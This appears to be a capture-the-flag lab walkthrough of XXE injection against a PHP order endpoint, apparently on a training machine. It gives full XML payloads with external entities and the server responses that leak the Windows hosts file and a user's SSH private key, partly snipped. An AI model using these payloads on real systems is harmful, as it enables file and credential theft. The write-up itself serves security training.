When accessing the login dashboard and inspecting services.php, this may be vulnerable to XXE injection.
```
### Request
<?xml version = "1.0"?><order><quantity>99</quantity><item>Home Appliances</item><address>123 fake st</address></order>

### Response
Your order for Home Appliances has been processed
```

https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

## Injection success
![[InjectionSuccessEtcHosts.png]]

### Altered Request
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/xml
Content-Length: 201
Origin: http://10.129.95.192
DNT: 1
Connection: keep-alive
Referer: http://10.129.95.192/services.php
Cookie: PHPSESSID=ob66h2kteq1m80e8k73spld1rl
Priority: u=0

<?xml version = "1.0"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///C:/windows/system32/drivers/etc/hosts"> ]>

<order><quantity>1</quantity><item>&example;</item><address>test</address></order>
```

### Response
```
HTTP/1.1 200 OK
Date: Tue, 26 Aug 2025 22:53:39 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 837
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Your order for # Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
 has been processed
```

## Grabbing daniel's ssh key :)
### Request:
```
<SNIP>

<?xml version = "1.0"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///C:/users/daniel/.ssh/id_rsa"> ]>

<order><quantity>1</quantity><item>&example;</item><address>test</address></order>
```

### Response:
```
HTTP/1.1 200 OK
Date: Tue, 26 Aug 2025 22:58:55 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 2636
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Your order for -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEArJgaPRF5S49ZB+Ql8cOhnURSOZ4nVYRSnPXo6FIe9JnhVRrdEiMi

< SNIPPED FOR GUIDE >
< If you want to follow, you have to step through! >

vRCD2pONhqZOjinGfGUMml1UaJZzxZs6F9hmOz+WAek89dPdD4rBCU2fS3J7bs9Xx2PdyA
m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
 has been processed
```